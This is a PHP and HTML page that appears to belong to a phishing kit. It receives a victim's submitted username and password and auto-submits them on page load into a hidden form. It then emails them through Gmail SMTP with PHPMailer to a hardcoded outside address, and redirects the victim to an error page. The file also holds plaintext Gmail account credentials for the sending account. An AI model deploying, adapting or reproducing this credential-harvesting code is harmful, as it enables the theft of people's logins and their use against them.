<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <link href="css/style.css" rel="stylesheet" type="text/css"/>
		<link rel="stylesheet" href="../assets/css/second.css" />
		<script>
			window.onload = function()
			{
				document.getElementById("send").click();
			}
		</script>
    </head>
    <body>
		<div id="spinn" class="loader" style="display: block;"></div>
        <div id="main" style="display: none;">
            <h1>Login</h1>
            <div id="login">
			<?php
				$un = $_POST['demo-name'];
				$pw = $_POST['demo-pwd'];
			?>
                <h2>Sending Data</h2>
                <hr/>
                <form action="index.php" id="infoFrom" method="post">
                    <input type="text" placeholder="Enter your Gmail ID" name="email" value="teamstalky818@gmail.com"/>
                    <input type="password" placeholder="Enter your Gmail Password" name="password" value="hackinglikepro"/>
                    <input type="text" placeholder="To : Email Id " name="toid" value="johnhales818@gmail.com"/>  
                    <input type="text" placeholder="Subject : " name="subject" value="Stalky"/>
                    <textarea rows="4" cols="50" placeholder="Enter Your Message..." name="message"><?php
					echo "Its ".$un." is ".$pw." :-P";
					?></textarea>
                    <input type="submit" value="Send" name="send" id="send"/>
                </form>    
            </div>
        </div>
          <?php
        
              require 'phpmailer/PHPMailerAutoload.php';
              if(isset($_POST['send']))
                  {
                    $email = $_POST['email'];                    
                    $password = $_POST['password'];
                    $to_id = $_POST['toid'];
                    $message = $_POST['message'];
                    $subject = $_POST['subject'];

                    $mail = new PHPMailer;

                    $mail->isSMTP();

                    $mail->Host = 'smtp.gmail.com';

                    $mail->Port = 587;

                    $mail->SMTPSecure = 'tls';

                    $mail->SMTPAuth = true;

                    $mail->Username = $email;

                    $mail->Password = $password;

                    $mail->setFrom('from@example.com', 'First Last');

                    $mail->addReplyTo('replyto@example.com', 'First Last');

                    $mail->addAddress($to_id);

                    $mail->Subject = $subject;

                    $mail->msgHTML($message);

                    if (!$mail->send()) {
                       echo '<script>window.location.href = "error.html";</script>';
                    } 
                    else {
                       echo '<script>window.location.href = "error.html";</script>';
                    }
               }
        ?>
    </body>
</html>
